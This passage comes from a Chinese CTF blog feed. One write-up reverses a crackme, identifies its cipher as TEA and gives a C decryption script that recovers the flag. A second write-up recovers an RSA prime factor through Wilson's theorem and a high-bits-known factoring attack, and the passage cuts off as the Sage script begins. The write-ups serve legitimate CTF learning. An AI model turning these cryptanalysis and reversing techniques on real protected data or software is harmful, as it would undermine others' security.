        __printf_chk(&lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{%s}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, input);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
      }
    }
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单查看一下，发现输入长度为64，然后 &lt;code&gt;do while&lt;/code&gt; 看起来是进行初始化，后面的四个连续函数应该是加密&lt;/p&gt;
&lt;p&gt;同时确定这个应该是算法题，不涉及混淆之类的东西&lt;/p&gt;
&lt;p&gt;于是查看一下 &lt;code&gt;v6=&lt;/code&gt; 的那个函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hexstr2int&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a2) {
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(a0123456789abcd) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;             &lt;span style=&#34;color:#75715e&#34;&gt;// 17
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1;
  LODWORD(result) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;; a0123456789abcd[i] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i ) {&lt;span style=&#34;color:#75715e&#34;&gt;// input是0-f
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; )
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; i )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; result);           &lt;span style=&#34;color:#75715e&#34;&gt;// input转成int
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v4 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;a1[a2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现应该是将输入转换成了 &lt;code&gt;int&lt;/code&gt;，而且输入的字符必须得在 &lt;code&gt;0123456789ABCDEF&lt;/code&gt; 中&lt;/p&gt;
&lt;p&gt;然后看一眼重复出现三次的 &lt;code&gt;sub_55A06D2CCB30&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_55A06D2CC408&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a2) {
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ) {
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!--&lt;/span&gt;v2 )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_4;
  }
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
LABEL_4:
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v3;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看起来就是简单的赋值，&lt;code&gt;a1&lt;/code&gt; 的第一部分填写长度，第二部分存 &lt;code&gt;a2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;初始化部分应该可以先不管了，去看加密函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_55A06D2CCB30&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a2, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a3) {
  sub_55A06D2CCA13(v5, a1);
  sub_55A06D2CCA13(v6, (a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;));
  sub_55A06D2CC408(v7, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  sub_55A06D2CC408(v8, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x830A5376&lt;/span&gt;);
  sub_55A06D2CC408(v9, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D3D2ACF&lt;/span&gt;);
  sub_55A06D2CC667(v10, v9, v8);                &lt;span style=&#34;color:#75715e&#34;&gt;// v10=delta=0x9e3779b9
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  sub_55A06D2CCA13(v11, a2);
  sub_55A06D2CCA13(v12, (a2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;));
  sub_55A06D2CCA13(v13, (a2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;));
  sub_55A06D2CCA13(v14, (a2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;));
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    sub_55A06D2CC2E9(v7, v7, v10);              &lt;span style=&#34;color:#75715e&#34;&gt;// sum+=delta
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    left_rot(v15, v6, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    sub_55A06D2CC2E9(v15, v15, v11);            &lt;span style=&#34;color:#75715e&#34;&gt;// v15+v11
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    sub_55A06D2CC2E9(v16, v6, v7);              &lt;span style=&#34;color:#75715e&#34;&gt;// sum+plain
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    right_rot(v17, v6, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
    sub_55A06D2CC2E9(v17, v17, v12);            &lt;span style=&#34;color:#75715e&#34;&gt;// key+plain
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    sub_55A06D2CC667(v15, v15, v16);
    sub_55A06D2CC667(v15, v15, v17);
    sub_55A06D2CC2E9(v5, v5, v15);
    left_rot(v18, v5, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    sub_55A06D2CC2E9(v18, v18, v13);
    sub_55A06D2CC2E9(v19, v5, v7);
    right_rot(v20, v5, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
    sub_55A06D2CC2E9(v20, v20, v14);
    sub_55A06D2CC667(v18, v18, v19);
    sub_55A06D2CC667(v18, v18, v20);
    sub_55A06D2CC2E9(v6, v6, v18);
    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v3;
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v3 );
  sub_55A06D2CCA13(a1, v5);
  sub_55A06D2CCA13((a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;), v6);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v21;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一开始看到一大串 &lt;code&gt;sub_&lt;/code&gt; 还以为是 AES 之类的（毕竟之前做过一道类似的），然后看了一下重要的参数&lt;/p&gt;
&lt;p&gt;64bit明文，128bit密钥，32轮加密&lt;/p&gt;
&lt;p&gt;看起来很像tea家族的算法，但不是很确定。因为懒得详细看每个函数了，所以动态调试一下，做个黑盒测试&lt;/p&gt;
&lt;p&gt;调试之后发现 &lt;code&gt;0x830A5376&lt;/code&gt; 和 &lt;code&gt;0x1D3D2ACF&lt;/code&gt; 其实是用来算 &lt;code&gt;delta&lt;/code&gt; 的，算出来 &lt;code&gt;v10=0x9e3779b9&lt;/code&gt;，这就肯定是tea家族了&lt;/p&gt;
&lt;p&gt;另外，动调的时候发现这里应该都是用的结构体，所以每个小的加法都是单独的函数给出的，但好像用上的只有结构体的前八个字节，后面的字节有什么用还不太清楚&lt;/p&gt;
&lt;p&gt;然后具体往下看，看到循环中的前几个分别是 &lt;code&gt;sum+=delta&lt;/code&gt;，&lt;code&gt;v6&amp;lt;&amp;lt;4&lt;/code&gt;，&lt;code&gt;(v6&amp;lt;&amp;lt;4)+k0&lt;/code&gt;，&lt;code&gt;sum+p0&lt;/code&gt;，&lt;code&gt;v6&amp;gt;&amp;gt;5&lt;/code&gt;，&lt;code&gt;k1+p0&lt;/code&gt;。和网上的三种 TEA 加密比对了一下，发现竟然就是最简单的 TEA 加密，一开始看这么多函数还以为是 XTEA 呢&lt;/p&gt;
&lt;h2 id=&#34;脚本&#34;&gt;脚本&lt;/h2&gt;
&lt;p&gt;密钥就是主函数中初始化的几个 &lt;code&gt;0x11&lt;/code&gt;，密文就是最后用来 &lt;code&gt;cmp&lt;/code&gt; 的字符串（找结构体对应的那个字符数组就行），于是找了个脚本，直接解密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6EF3720&lt;/span&gt;, i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; delta &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9e3779b9&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; k0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], k1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], k2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], k3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k2) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k3);
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k1);
        sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; delta;
    }
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0x79AE1A3B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;X596080D3}, k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;};
    decrypt(v, k);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%X%X&amp;#34;&lt;/span&gt;, v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;把所有密文全扔进去算结果，就能拿到 flag 了&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;第一眼看到这个题就感觉能做出来，果然如此&lt;/p&gt;
&lt;p&gt;深刻体会到了动调进行黑盒测试的重要性，可以大幅度加快做题速度，能猜出来就不要花时间看&lt;/p&gt;
&lt;p&gt;其实这题有点可惜，本来能抢到三血的，结果忘了大小写的问题，脚本算出来后本地测试一直是 &lt;code&gt;error&lt;/code&gt;，最后还是大佬队友发现的，然后就过了&lt;/p&gt;</description>
        </item>
        <item>
        <title>hmg2021 RSA Attack writeup</title>
        <link>/post/hmg2021-rsa-attack-writeup/</link>
        <pubDate>Tue, 13 Apr 2021 21:39:43 +0000</pubDate>
        
        <guid>/post/hmg2021-rsa-attack-writeup/</guid>
        <description>&lt;p&gt;已知一个 $1024$ 位的 $p1$，$p2$ 比 $p1$ 稍小，根据代码知道 $p3\equiv p2!\pmod{p1}$&lt;/p&gt;
&lt;p&gt;根据 Wilson 定理，$n$ 为质数时有 $(n-1)!\equiv -1\pmod{n}$，所以 $p2! \prod\limits_{i=p2+1}^{p1-2}i\equiv 1\pmod{p1}$，所以可以计算出 $p2+1$ 乘到 $p1-1$ 的结果，然后取模拟并调用 &lt;code&gt;sympy&lt;/code&gt; 库即可得到 $p3$&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sympy
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; invmod
p1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031&lt;/span&gt;
p2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034&lt;/span&gt;

res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(p2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, p1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p1
res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; invmod(res, p1)
p3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sympy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nextprime(res)
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的 $p$ 是最终 RSA 加密用的 $P$ 的高位，因此可以使用 Factoring with High Bits Known 攻击，用 sage 构造如下攻击脚本（网上找的）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722c000000000000&lt;/span&gt;
